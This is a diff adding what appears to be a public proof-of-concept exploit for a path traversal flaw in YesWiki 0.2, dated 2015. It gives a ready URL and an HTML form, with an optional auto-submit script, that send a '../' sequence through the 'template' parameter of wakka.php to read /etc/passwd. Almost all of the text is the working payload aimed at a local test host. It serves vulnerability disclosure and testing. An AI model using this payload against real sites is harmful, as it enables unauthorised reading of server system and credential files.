@@ -1,0 +1,26 @@
+# Exploit Title: YESWIKI 0.2 - Path Traversal (template param)
+# Date: 2015-11-10
+# Exploit Author: HaHwul
+# Exploit Author Blog: http://www.codeblack.net
+# Vendor Homepage: http://yeswiki.net
+# Software Link: https://github.com/YesWiki/yeswiki
+# Version: yeswiki 0.2
+# Tested on: Debian [Wheezy] , Ubuntu
+# CVE : none
+# ===========================================
+<!-- Open Browser: http://127.0.0.1/vul_test/yeswiki/wakka.php?wiki=HomePage/diaporama&template=/../../../../../../../../../../../../etc/passwd
+--><br>
+# Exploit Code<br>
+# ===========================================
+<br><br>
+
+<form name="yeswiki_traversal2_poc" action="http://127.0.0.1/vul_test/yeswiki/wakka.php" method="GET">
+<input type="hidden" name="wiki" value="HomePage/diaporama">
+Target: Edit HTML Code<br>
+File: <input type="text" name="template" value="/../../../../../../../../../../../../etc/passwd"><br>
+
+<input type="submit" value="Exploit">
+</form>
+<!-- Auto Sumbit
+<script type="text/javascript">document.forms.yeswiki_traversal2_poc.submit();</script>
+-->
